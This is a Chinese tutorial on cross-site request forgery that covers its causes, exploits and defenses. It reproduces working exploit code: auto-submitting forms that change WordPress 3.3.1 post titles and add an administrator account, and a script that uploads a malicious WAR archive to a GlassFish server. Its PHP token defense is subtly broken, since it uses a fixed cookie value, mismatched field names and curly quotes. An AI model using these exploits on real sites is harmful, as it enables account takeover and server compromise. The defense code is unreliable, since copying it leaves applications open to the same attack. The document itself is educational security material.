[![返回目录](https://i.postimg.cc/50XLzC7C/image.png)](https://parg.co/UHU)

# CSRF 跨站请求详解

CSRF (Cross-site request forgery)，中文名称：跨站请求伪造，也被称为：one click attack/session riding ，缩写为：CSRF/XSRF 。 CSRF 与 XSS 在攻击手段上有点类似，都是在客户端执行恶意代码，有些文章中认为 CSRF 与 XSS 的区别在于 CSRF 不注重于获取用户 Cookie，笔者认为可能还有区别在于 CSRF 不仅可以在源站发起攻击，还可以引导用户访问其他危险网站的同时发起攻击。XSS 全程是跨站脚本攻击，即攻击者向某个 Web 页面中插入恶意的 JavaScript 脚本，而当普通用户访问时，该恶意脚本自动执行而从盗取用户的 Cookie 等信息。对于 XSS 的防御手段主要就是输入检查与输出检查，譬如对用户输入的文本框内容进行 <、> 这样的特殊字符检查。而输出检查则是指对于输出到网页的内容进行过滤或者编解码，譬如使用 HTML 编码将 < 转义。CSRF 为跨站请求伪造，其与 XSS 有点类似，不过区别在于 CSRF 不一定依赖于 JavaScript，并且不仅可以在源站发起攻击，还有可能当用户访问恶意网站时引导其访问原网站。CSRF 攻击是源于 WEB 的隐式身份验证机制，WEB 的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。对于 CSRF 的防御也分为服务端防御与客户端防御两种，服务端防御典型的譬如给某个页面添加随机数，使得无法从第三方页面直接提交。在客户端防御的话可以利用譬如 Firefox 提供的一些检查工具。注意，CSRF 并没有打破同源策略。

![](https://coding.net/u/hoteam/p/Cache/git/raw/master/2016/8/1/ED00B51D-6854-4B92-9416-AC108B3FF2A1.png)

以下面的这个例子来说：银行网站 A，它以 GET 请求来完成银行转账的操作，如：`http://www.mybank.com/Transfer.php?toBankId=11&money=1000`危险网站 B，它里面有一段 HTML 的代码如下：

```
<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>
```

银行网站 A 违反了 HTTP 规范，使用 GET 请求更新资源。在访问危险网站 B 的之前，你已经登录了银行网站 A，而 B 中的<img>以 GET 的方 式请求第三方资源(这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了)，所以你的浏览器会带上你的银行网站 A 的 Cookie 发出 Get 请求，去获取资源 “http://www.mybank.com/Transfer.php?toBankId=11& money=1000”，结果银行网站服务器收到请求后，认为这是一个更新资源操作(转账操作)，所以就立刻进行转账操作。参考[深入解析跨站请求伪造漏洞：原理剖析 (](http://netsecurity.51cto.com/art/200812/102951_1.htm)中所述，XSS 与 CSRF 的区别在于：

- XSS 攻击需要 JavaScript，而 CSRF 攻击不需要。
- XSS 攻击要求站点接受恶意代码，而对于 CSRF 攻击来说，恶意代码位于第三方站点上。过滤用户的输入可以防止恶意代码注入到某个站点，但是它无阻止法恶意代码在第三方站点上运行。

## 原因浅析

CSRF 攻击是源于 WEB 的隐式身份验证机制，WEB 的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。假设 Alice 访问了一个恶意站点 M，该站点提供的内容中的 JavaScript 代码或者图像标签会导致 Alice 的浏览器向站点 T 发送一个 HTTP 请求。由于该请求是发给站点 T 的，所以 Alice 的浏览器自动地给该请求附上与站点 T 对应的该会话 cookie 的 sid。站点 T 看到该请求时，它就能通过该 cookie 的推断出：该请求来自 Alice，所以站点 T 就会对 Alice 的帐户执行所请求的操作。这样，CSRF 攻击就能得逞了。其他大多数 Web 认证机制也面临同样的问题。例如，HTTP BasicAuth 机制会要求 Alice 告诉浏览器她在站点 T 上的用户名和口令，于是浏览器将用户名和口令附加到之后发给站点 T 的请求中。当然，站点 T 也 可能使用客户端 SSL 证书，但这也面临同样的问题，因为浏览器也会将证书附加到发给站点 T 的请求中。类似的，如果站点 T 通过 IP 地址来验证 Alice 的身 份的话，照样面临 CSRF 攻击的威胁。总之，只要身份认证是隐式进行的，就会存在 CSRF 攻击的危险，因为浏览器发出请求这一动作未必是受用户的指使。原则上，这种威胁可以通过对每个发送至该 站点的请求都要求用户进行显式的、不可欺骗的动作(诸如重新输入用户名和口令)来消除，但实际上这会导致严重的易用性问题。大部分标准和广泛应用的认证机 制都无法防止 CSRF 攻击，所以我们只好另外探求一个实用的解决方案。

# Exploits

本部分我们来看几个基于 CSRF 攻击的实例，包括[简单的基于表单 POST 请求的攻击](http://www.exploit-db.com/exploits/18791/) ，其可以诱导用户点击`.submit()` 按钮既可以发起攻击。其他的还有稍微复杂一点的[跨域文件上传 CSRF 攻击](http://www.exploit-db.com/exploits/18766/) ，其主要使用了 [CORS use of the xhr.withCredentals behavior](http://blog.kotowicz.net/2011/05/cross-domain-arbitrary-file-upload.html)。

## [Wordpress 3.3.1 Multiple CSRF Vulnerabilities](https://www.exploit-db.com/exploits/18791/)

该漏洞是由[Ivano Binetti](http://www.ivanobinetti.com)在 2012 年 3 月 19 号发现的，影响了[WordPress 3.3.1 版本 ](http://wordpress.org/wordpress-3.3.1.zip)，CVE 编号 CVE-2012-1936。WordPress 是众所周知的博客平台，该漏洞可以允许攻击者修改某个 Post 的标题，添加管理权限用户以及操作用户账户，包括但不限于删除评论、修改头像等等。具体的列表如下 :

- Add Admin/User
- Delete Admin/User
- Approve comment
- Unapprove comment
- Delete comment
- Change background image
- Insert custom header image
- Change site title
- Change administrator's email
- Change Wordpress Address
- Change Site Address

那么这个漏洞实际上就是攻击者引导用户先进入目标的 WordPress，然后点击其钓鱼站点上的某个按钮，该按钮实际上是表单提交按钮，其会触发表单的提交工作，核心的 Exploit 代码为 :

```html
<html>
  <body onload="javascript:document.forms[0].submit()">
    <h2>CSRF Exploit to change post title</h2>
    <form
      method="POST"
      name="form0"
      action="http://<wordpress_ip>:80/wp-admin/admin-ajax.php"
    >
      <input type="hidden" name="post_title" value="hackedtitle" />
      <input type="hidden" name="post_name" value="hackedtitle" />
      <input type="hidden" name="mm" value="03" />
      <input type="hidden" name="jj" value="16" />
      <input type="hidden" name="aa" value="2012" />
      <input type="hidden" name="hh" value="" />
      <input type="hidden" name="mn" value="" />
      <input type="hidden" name="ss" value="" />
      <input type="hidden" name="post_author" value="1" />
      <input type="hidden" name="post_password" value="" />
      <input type="hidden" name="post_category%5B%5D" value="0" />
      <input type="hidden" name="post_category%5B%5D" value="1" />
      <input type="hidden" name="tax_input%5Bpost_tag%5D" value="" />
      <input type="hidden" name="comment_status" value="open" />
      <input type="hidden" name="ping_status" value="open" />
      <input type="hidden" name="_status" value="publish" />
      <input type="hidden" name="post_format" value="0" />
      <input type="hidden" name="_inline_edit" value="<sniffed_value>" />
      <input type="hidden" name="post_view" value="list" />
      <input type="hidden" name="screen" value="edit-post" />
      <input type="hidden" name="action" value="inline-save" />
      <input type="hidden" name="post_type" value="post" />
      <input type="hidden" name="post_ID" value="1" />
      <input type="hidden" name="edit_date" value="true" />
      <input type="hidden" name="post_status" value="all" />
    </form>
  </body>
</html>
```

另一个测试用例时添加某个具有管理员权限的用户，测试用例为 :

```html
<html>
  <body onload="javascript:document.forms[0].submit()">
    <h2>CSRF Exploit to add Administrator</h2>
    <form
      method="POST"
      name="form0"
      action="http://<wordpress_ip>:80/wp-admin/user-new.php"
    >
      <input type="hidden" name="action" value="createuser" />
      <input
        type="hidden"
        name="_wpnonce_create-user"
        value="<sniffed_value>"
      />
      <input
        type="hidden"
        name="_wp_http_referer"
        value="%2Fwordpress%2Fwp-admin%2Fuser-new.php"
      />
      <input type="hidden" name="user_login" value="admin2" />
      <input type="hidden" name="email" value="admin2@admin.com" />
      <input type="hidden" name="first_name" value="admin2@admin.com" />
      <input type="hidden" name="last_name" value="" />
      <input type="hidden" name="url" value="" />
      <input type="hidden" name="pass1" value="password" />
      <input type="hidden" name="pass2" value="password" />
      <input type="hidden" name="role" value="administrator" />
      <input type="hidden" name="createuser" value="Add+New+User+" />
    </form>
  </body>
</html>
```

## Oracle GlassFish Server - REST Cross-Site Request Forgery

该漏洞是由 Security-Assessment.com 发现的，Oracle GlassFish 服务器的 REST 接口可以被 CSRF 请求攻击，譬如其可以允许普通用户任意上传 WAR 包，并且可以控制在服务端运行从而导致窃取其他运行应用的信息。关于具体的攻击复盘可以参考[这里](http://blog.kotowicz.net/2011/04/how-to-upload-arbitrary-file-contents.html)。其攻击手段是首先在钓鱼站点上设置如下按钮 :

```
<button id="upload" onclick="start()" type="button">Upload WAR Archive</button>
```

然后添加如下脚本 :

```js
var logUrl = 'http://glassfishserver/management/domain/applications/application';

function fileUpload(fileData, fileName) {
    var fileSize = fileData.length,
      boundary = "---------------------------270883142628617",
      uri = logUrl,
      xhr = new XMLHttpRequest();

    var additionalFields = {
          asyncreplication: "true",
          availabilityenabled: "false",
          contextroot: "",
        createtables: "true",
        dbvendorname: "",
        deploymentplan: "",
        description: "",
        dropandcreatetables: "true",
        enabled: "true",
        force: "false",
        generatermistubs: "false",
        isredeploy: "false",
        keepfailedstubs: "false",
        keepreposdir: "false",
        keepstate: "true",
        lbenabled: "true",
        libraries: "",
        logReportedErrors: "true",
        name: "",
        precompilejsp: "false",
        properties: "",
        property: "",
        retrieve: "",
        target: "",
        type: "",
        uniquetablenames: "true",
        verify: "false",
        virtualservers: "",
        __remove_empty_entries__: "true"

    }

    if (typeof XMLHttpRequest.prototype.sendAsBinary == "function") { // Firefox 3 & 4
    var tmp = '';
    for (var i = 0; i < fileData.length; i++) tmp +=
String.fromCharCode(fileData.charCodeAt(i) & 0xff);
    fileData = tmp;
  }
  else { // Chrome 9
    // http://javascript0.org/wiki/Portable_sendAsBinary
    XMLHttpRequest.prototype.sendAsBinary = function(text){
      var data = new ArrayBuffer(text.length);
      var ui8a = new Uint8Array(data, 0);
      for (var i = 0; i < text.length; i++) ui8a[i] = (text.charCodeAt(i) & 0xff);

      var bb = new (window.BlobBuilder || window.WebKitBlobBuilder)();

      bb.append(data);
      var blob = bb.getBlob();
      this.send(blob);

    }
  }
    var fileFieldName = "id";
    xhr.open("POST", uri, true);
    xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary="+boundary); // simulate a
file MIME POST request.
    xhr.setRequestHeader("Content-Length", fileSize);
    xhr.withCredentials = "true";
    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4) {
        if ((xhr.status >= 200 && xhr.status <= 200) || xhr.status == 304) {

          if (xhr.responseText != "") {
            alert(JSON.parse(xhr.responseText).msg);
          }
        } else if (xhr.status == 0) {

        }
      }
    }

    var body = "";

    for (var i in additionalFields) {
      if (additionalFields.hasOwnProperty(i)) {
        body += addField(i, additionalFields[i], boundary);
      }
    }

    body += addFileField(fileFieldName, fileData, fileName, boundary);
    body += "--" + boundary + "--";
    xhr.sendAsBinary(body);
    return true;
}

function addField(name, value, boundary) {
  var c = "--" + boundary + "\r\n"
  c += 'Content-Disposition: form-data; name="' + name + '"\r\n\r\n';
  c += value + "\r\n";
  return c;
}

function addFileField(name, value, filename, boundary) {
    var c = "--" + boundary + "\r\n"
    c += 'Content-Disposition: form-data; name="' + name + '"; filename="' + filename + '"\r\n';
    c += "Content-Type: application/octet-stream\r\n\r\n";
    c += value + "\r\n";
    return c;
}

function getBinary(file){
  var xhr = new XMLHttpRequest();
  xhr.open("GET", file, false);
  xhr.overrideMimeType("text/plain; charset=x-user-defined");
  xhr.send(null);
  return xhr.responseText;
}

function readBinary(data) {

var tmp = '';
    for (var i = 0; i < data.length; i++) tmp += String.fromCharCode(data.charCodeAt(i) &
0xff);
    data = tmp;
    return tmp;
    }

function start() {
  var c = getBinary('maliciousarchive.war');
  fileUpload(c, "maliciousarchive.war");

}
```

# 防御

## 服务端防御

### 遵循标准的 GET 动作

只允许 GET 请求检索数据，但是不允许它修改服务器上的任何数据。这个修改可以防止利用 {img} 标签或者其它的类型的 GET 请求的 CSRF 攻击。另外，这个建议遵循 RFC 2616(HTTP/1.1)：具体说来，按照约定，GET 和 HEAD 方法不应该进行检索之外的动作。这些方法应该被认为是 “ 安全的 ”。虽然这个保护措施无法阻止 CSRF 本身，因 为攻击者可以使用 POST 请求，但是它却可以与 (2) 结合来全面防止 CSRF 漏洞。这里，我们假定对手无法修改用户的 cookie。

### 为页面增加随机数

当用户访问站点时，该站点应该生成一个(密码上很强壮的)伪随机值，并在用户的计算机上将其设为 cookie。站点应该要求每个表单都包含该伪随机 值(作为表单值和 cookie 值)。当一个 POST 请求被发给站点时，只有表单值和 cookie 值相同时，该请求才会被认为是有效的。当攻击者以一个用户的名义提交表单时，他只能修改该表单的值。攻击者不能读取任何发自该服务器的数据或者修改 cookie 值，这是同源策略的缘故。这意味着，虽然攻击者可以用表单发送任何他想要的值，但是他却不能修改或者读取存储在该 cookie 中的值。因为 cookie 值和表单值必须是相同的，所 以除非攻击者能猜出该伪随机值，否则他就无法成功地提交表单。以 PHP 为例，我们可以在服务端首先生成随机数：

```php
　<?php
　　　　// 构造加密的Cookie信息
　　　　$value = “DefenseSCRF”;
　　　　setcookie(”cookie”, $value, time()+3600);
　　?>
```

在表单里增加 Hash 值，以认证这确实是用户发送的请求。

```
<?php
　　　　$hash = md5($_COOKIE['cookie']);
　　?>
　　<form method=”POST” action=”transfer.php”>
　　　　<input type=”text” name=”toBankId”>
　　　　<input type=”text” name=”money”>
　　　　<input type=”hidden” name=”hash” value=”<?=$hash;?>”>
　　　　<input type=”submit” name=”submit” value=”Submit”>
　　</form>
```

然后在服务器端进行 Hash 值验证：

```php
      <?php
　　      if(isset($_POST['check'])) {
     　　      $hash = md5($_COOKIE['cookie']);
          　　 if($_POST['check'] == $hash) {
               　　 doJob();
　　           } else {
　　　　　　　　//...
          　　 }
　　      } else {
　　　　　　//...
　　      }
      ?>
```

当然，我们也可以强制要求用户进行任何增删改的操作时都需要输入验证码，即进行用户交互，不过这样也就意味着很差的用户体验。

## 客户端防御

由于使攻击者成功地执行 CSRF 攻击的请求是由浏览器发出的，所以可以创建客户端工具来保护用户不受此种攻击。现有的工具 RequestRodeo 通过在客户和服务器之间充当代理来防止 CSRF 攻击。如果 RequestRodeo 发现了一个它认为是非法的请求，它会从该请求剥离验证信息。虽然这种方 式在很多情况下都能有效，但是它具有一些局限性。具体地说，当客户端使用了 SSL 认证或者使用 JavaScript 生成部分页面(因为 RequestRodeo 分析的是在浏览器显示之前的流经代理的那些数据)时，它就不起作用了。 人们已经开发了一个浏览器插件，不仅可以使用户可以免受某些类型的 CSRF 攻击，并且还能克服以上所述的局限性，这个工具是作为 Firefox 浏览器的扩展实现的，其地址是http://www.cs.princeton.edu/˜wzeller/csrf/protector/。 为了有效地防范 CSRF 攻击，用户需要下载安装这个扩展。该扩展会拦截所有的 HTTP 请求，并判断是否允许该 HTTP 请求。这个判断要用到下列规则。首 先，POST 请求之外的任何要求都是允许的。第二，如果发出请求的站点和目标站点符合同源策略的要求，那么该请求被允许。第三，如果发出请求的站点被允许 使用 Adobe 的跨域政策来建立一个请求的话，那么该请求也会被允许。如果我们的扩展拒绝一个请求，该扩展会通过一个常见的界面来提示用户(即 Firefox 所使用的 popup blocker)该请求已经被阻止，并且让用户选择是否将站点添加到一个白名单中。该扩展仅仅拦截 POST 请求。这意味着，它无法保护用户免受使用 GET 请求的 CSRF 攻击 阻止这种类型的攻击的唯一方法是不允许任何跨域 GET 请求，或只允许用户一次只能登录到一个站点，但是这两个限制可能是用户无法忍受的。
